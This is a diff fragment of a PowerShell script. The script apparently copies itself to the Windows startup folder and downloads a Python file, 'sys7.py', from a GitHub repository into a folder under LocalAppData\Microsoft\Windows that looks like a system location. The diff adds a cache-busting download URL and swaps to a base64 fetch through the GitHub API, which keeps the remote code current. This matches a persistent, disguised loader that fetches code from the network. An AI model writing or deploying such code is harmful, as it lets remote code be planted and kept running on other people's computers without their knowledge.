@@ -73,7 +73,7 @@ while ($true) {
 # local variables 
 
 
-$pythonFileUrl = "https://raw.githubusercontent.com/ProgrammerJibon/wactherHelper/main/sys7.py"
+$pythonFileUrl = "https://raw.githubusercontent.com/ProgrammerJibon/wactherHelper/main/sys7.py?cb=$([guid]::NewGuid())"
 $saveFolder = "$env:LOCALAPPDATA\Microsoft\Windows"
 $savePath = "$saveFolder\sys7.py"
 
@@ -128,13 +128,25 @@ function Copy-SelfToStartup {
 # download latest python file
 
 
-# donwload file function
-function Donwload-File{
+function Donwload-File {
+    echo "Downloading latest python file..."
+
     if (-not (Test-Path $saveFolder)) {
         New-Item -Path $saveFolder -ItemType Directory | Out-Null
     }
-    Invoke-WebRequest -Uri $pythonFileUrl -OutFile $savePath
+
+    $owner = "ProgrammerJibon"
+    $repo = "wactherHelper"
+    $path = "sys7.py"
+    $apiUrl = "https://api.github.com/repos/$owner/$repo/contents/$path"
+
+    $response = Invoke-RestMethod -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" }
+
+    [System.IO.File]::WriteAllBytes($savePath, [System.Convert]::FromBase64String($response.content))
+
+    echo "Download completed."
 }
+
 
 
 
@@ -152,7 +164,6 @@ if (Test-Path $savePath) {
     Copy-SelfToStartup
     Donwload-File
 }
-
 
 
 
